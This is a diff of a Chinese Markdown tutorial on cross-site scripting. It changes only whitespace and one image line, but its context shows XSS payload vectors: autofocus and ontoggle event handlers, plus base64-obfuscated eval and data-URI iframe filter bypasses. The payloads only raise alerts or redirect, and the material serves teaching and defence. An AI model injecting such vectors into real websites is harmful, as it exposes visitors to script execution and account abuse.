@@ -1,6 +1,4 @@
 # XSS 跨站脚本攻击
-![xss](img/xss.png) 
-
 XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。
 
 从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。
@@ -193,17 +191,17 @@ Content-Security-Policy: child-src 'none'
 ### `<input>`
 
     <input onfocus="alert('xss');">
-
+    
     竞争焦点，从而触发onblur事件
     <input onblur=alert("xss") autofocus><input autofocus>
-
+    
     通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
     <input onfocus="alert('xss');" autofocus>
 
 ### `<details>`
 
     <details ontoggle="alert('xss');">
-
+    
     使用open属性触发ontoggle事件，无需用户去触发
     <details open ontoggle="alert('xss');">
 
@@ -214,7 +212,7 @@ Content-Security-Policy: child-src 'none'
 ### `<select>`
 
     <select onfocus=alert(1)></select>
-
+    
     通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
     <select onfocus=alert(1) autofocus>
 
@@ -363,7 +361,7 @@ hex绕过
 base64绕过
 
     <img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">
-
+    
     <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
 
 过滤双引号，单引号
